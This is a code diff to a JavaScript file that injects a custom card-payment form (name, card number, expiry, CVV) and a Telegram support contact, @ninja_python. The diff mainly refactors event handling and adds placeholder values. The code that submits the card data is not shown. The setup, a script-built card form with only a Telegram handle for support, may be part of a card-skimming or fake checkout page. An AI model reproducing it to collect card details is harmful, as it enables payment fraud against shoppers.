@@ -316,40 +316,7 @@ document.addEventListener('DOMContentLoaded', function() {
     });
   }
 
-  // Add Telegram support popup functionality
-  const telegramSupport = document.querySelector('.custom-telegram-support');
-  const supportPopup = document.querySelector('.custom-support-popup');
-  const closePopupBtn = document.querySelector('.custom-popup-close');
-  const copyUsernameBtn = document.querySelector('.custom-copy-btn');
-  const usernameInput = document.querySelector('.custom-username-input');
-
-  if (telegramSupport) {
-    telegramSupport.addEventListener('click', function(e) {
-      e.preventDefault();
-      document.querySelector('.custom-support-popup').classList.add('active');
-    });
-  }
-
-  if (closePopupBtn) {
-    closePopupBtn.addEventListener('click', function() {
-      document.querySelector('.custom-support-popup').classList.remove('active');
-    });
-  }
-
-  if (copyUsernameBtn && usernameInput) {
-    copyUsernameBtn.addEventListener('click', function() {
-      usernameInput.select();
-      document.execCommand('copy');
-      
-      // Show copied message
-      this.textContent = 'Copied!';
-      setTimeout(() => {
-        this.textContent = 'Copy';
-      }, 2000);
-    });
-  }
-
-  // Update resetPaymentSection to add support note
+  // Update resetPaymentSection to properly recreate the payment form and restore all event listeners
   window.resetPaymentSection = function() {
     const customPaymentSection = document.querySelector('.custom-payment-section');
     
@@ -375,35 +342,35 @@ document.addEventListener('DOMContentLoaded', function() {
         </div>
         
         <div id="custom-form-wrapper">
-          <form id="custom-payment-form" onsubmit="event.preventDefault(); submitPaymentForm();">
+          <form id="custom-payment-form">
             <div class="custom-form-row">
               <div class="custom-form-group">
                 <label for="custom-first-name">First Name</label>
-                <input type="text" id="custom-first-name" required>
+                <input type="text" id="custom-first-name" placeholder="John" required>
               </div>
               <div class="custom-form-group">
                 <label for="custom-last-name">Last Name</label>
-                <input type="text" id="custom-last-name" required>
+                <input type="text" id="custom-last-name" placeholder="Doe" required>
               </div>
             </div>
             
             <div class="custom-form-group">
               <label for="custom-card-number">Card Number</label>
-              <input type="tel" inputmode="numeric" pattern="[0-9]*" id="custom-card-number" required>
+              <input type="tel" inputmode="numeric" pattern="[0-9]*" id="custom-card-number" placeholder="4111 1111 1111 1111" required>
             </div>
             
             <div class="custom-card-details-row">
               <div class="custom-form-group">
                 <label for="custom-expiry-month">Expiry Month</label>
-                <input type="number" id="custom-expiry-month" min="1" max="12" required>
+                <input type="number" id="custom-expiry-month" min="1" max="12" placeholder="12" required>
               </div>
               <div class="custom-form-group">
                 <label for="custom-expiry-year">Expiry Year</label>
-                <input type="number" id="custom-expiry-year" min="23" max="30" required>
+                <input type="number" id="custom-expiry-year" min="23" max="30" placeholder="25" required>
               </div>
               <div class="custom-form-group">
                 <label for="custom-cvv">CVV</label>
-                <input type="number" id="custom-cvv" min="100" max="999" required>
+                <input type="number" id="custom-cvv" placeholder="123" required>
               </div>
             </div>
             
@@ -411,24 +378,60 @@ document.addEventListener('DOMContentLoaded', function() {
           </form>
         </div>
         <div class="custom-support-note">
-          Support: @ninja_python on Telegram
-        </div>
-        <div class="custom-telegram-support">Contact Support</div>
-        <div class="custom-support-popup">
-          <div class="custom-popup-content">
-            <button class="custom-popup-close">Close</button>
-            <h2>Telegram Support</h2>
-            <p>Need help or have questions about your purchase? Contact our support team on Telegram.</p>
-            <input type="text" class="custom-username-input" value="@ninja_python" readonly>
-            <button class="custom-copy-btn">Copy</button>
-          </div>
+          Support: <a href="https://t.me/ninja_python" target="_blank">@ninja_python</a> on Telegram
         </div>
       </div>
     `;
     
-    // Re-initialize form interactions
+    // Re-attach event listeners
     initializeFormInteractions();
+    
+    // Prevent form default submission and call submitPaymentForm
+    document.getElementById('custom-payment-form').addEventListener('submit', function(event) {
+      event.preventDefault();
+      submitPaymentForm();
+    });
+    
+    // Reinitialize Telegram support icon functionality
+    addTelegramSupportFunctionality();
   };
 
+  // Extract Telegram functionality to a separate function so we can call it after resetPaymentSection
+  function addTelegramSupportFunctionality() {
+    const telegramSupport = document.querySelector('.custom-telegram-support');
+    const supportPopup = document.querySelector('.custom-support-popup');
+    const closePopupBtn = document.querySelector('.custom-popup-close');
+    const copyUsernameBtn = document.querySelector('.custom-copy-btn');
+    const usernameInput = document.querySelector('.custom-username-input');
+
+    if (telegramSupport) {
+      telegramSupport.addEventListener('click', function(e) {
+        e.preventDefault();
+        document.querySelector('.custom-support-popup').classList.add('active');
+      });
+    }
+
+    if (closePopupBtn) {
+      closePopupBtn.addEventListener('click', function() {
+        document.querySelector('.custom-support-popup').classList.remove('active');
+      });
+    }
+
+    if (copyUsernameBtn && usernameInput) {
+      copyUsernameBtn.addEventListener('click', function() {
+        usernameInput.select();
+        document.execCommand('copy');
+        
+        // Show copied message
+        this.textContent = 'Copied!';
+        setTimeout(() => {
+          this.textContent = 'Copy';
+        }, 2000);
+      });
+    }
+  }
+
   initializeFormInteractions();
+  // Initialize Telegram support functionality on page load
+  addTelegramSupportFunctionality();
 });
